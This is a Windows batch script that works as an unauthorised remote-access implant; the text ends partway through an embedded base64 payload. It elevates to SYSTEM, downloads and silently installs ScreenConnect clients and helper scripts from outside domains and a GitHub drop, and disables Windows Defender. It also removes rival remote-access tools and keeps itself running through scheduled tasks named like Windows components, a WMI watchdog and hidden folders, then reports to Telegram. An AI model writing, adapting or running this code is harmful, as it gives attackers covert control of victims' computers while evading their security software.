@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O45 - fix stuck registered Gryxa (svc/dir gone) /fa + ARP nuke
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O45 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O45" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O45 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M32" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L21" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTMyDQpyZW0gIE80NDogcGVyLUdyeXhhIHN0YXRlKzI0aCBSRVNUT1JFRCBzdXBwcmVz
cyAoc3RvcCBURyBmbG9vZCk7IG5vIHN0YXRlIGNsb2JiZXIuDQpyZW0gIEF1dGhvcml6ZWQgaW50
ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
